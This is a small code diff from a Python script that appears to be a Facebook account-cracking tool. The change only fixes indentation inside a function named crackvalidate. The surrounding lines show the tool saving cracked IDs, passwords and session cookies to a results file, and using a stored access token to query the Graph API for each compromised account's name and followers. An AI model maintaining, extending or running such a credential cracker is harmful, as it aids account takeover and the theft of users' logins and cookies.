@@ -847,7 +847,7 @@ def crackvalidate(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
-			    token = open('.tok.txt','r').read()
+				token = open('.tok.txt','r').read()
 				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
 				response = requests.get(urlb)
 				data = response.json()
